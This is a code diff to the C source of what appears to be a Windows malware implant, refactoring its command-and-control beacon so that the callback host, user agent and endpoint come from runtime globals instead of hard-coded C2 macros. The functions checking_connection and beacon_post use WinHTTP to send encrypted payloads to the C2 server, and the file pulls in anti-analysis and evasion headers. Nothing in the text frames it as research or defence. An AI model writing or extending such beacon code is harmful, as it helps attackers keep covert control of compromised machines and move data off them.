@@ -1,5 +1,6 @@
 #include "comms.h"
 #include "anti_analysis.h"
+#include "beacon.h"
 #include "common.h"
 #include "crypto.h"
 #include "evasion.h"
@@ -144,12 +145,12 @@ BOOL checking_connection(BOOL *Connection) {
   DWORD statusCode = 0;
   DWORD statusSize = sizeof(DWORD);
 
-  hSession = WinHttpOpen(C2_USERAGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+  hSession = WinHttpOpen(g_CallbackUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
   if (!hSession)
     goto cleanup;
 
-  hConnect = WinHttpConnect(hSession, C2_HOST, CALLBACK_PORT, 0);
+  hConnect = WinHttpConnect(hSession, g_CallbackHost, CALLBACK_PORT, 0);
   if (!hConnect)
     goto cleanup;
 
@@ -191,6 +192,7 @@ cleanup:
     WinHttpCloseHandle(hSession);
   return *Connection;
 }
+
 
 
 static ULONG Random32(VOID) {
@@ -413,15 +415,15 @@ BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
   }
 
   
-  hSession = pOpen(C2_USERAGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+  hSession = pOpen(g_CallbackUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
   if (!hSession)
     goto CLEANUP;
 
-  hConnect = pConnect(hSession, C2_HOST, C2_PORT, 0);
+  hConnect = pConnect(hSession, g_CallbackHost, CALLBACK_PORT, 0);
   if (!hConnect)
     goto CLEANUP;
-  hRequest = pOpenReq(hConnect, L"POST", C2_ENDPOINT, NULL, WINHTTP_NO_REFERER,
+  hRequest = pOpenReq(hConnect, L"POST", g_CallbackEndpoint, NULL, WINHTTP_NO_REFERER,
                       WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
   if (!hRequest) {
     printf("[!] pOpenReq FAILED: %lu\n", GetLastError());
@@ -443,7 +445,7 @@ BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
 #endif
 
   printf("[COMMS] Sending %lu encrypted bytes to %S:%d%S\n", dwEncryptSize,
-         C2_HOST, C2_PORT, C2_ENDPOINT);
+         g_CallbackHost, CALLBACK_PORT, g_CallbackEndpoint);
   if (!pSend(hRequest, L"Content-Type: application/octet-stream\r\n",
              (DWORD)-1L, pEncrypted, dwEncryptSize, dwEncryptSize, 0)) {
     printf("[!] pSend FAILED: %lu\n", GetLastError());
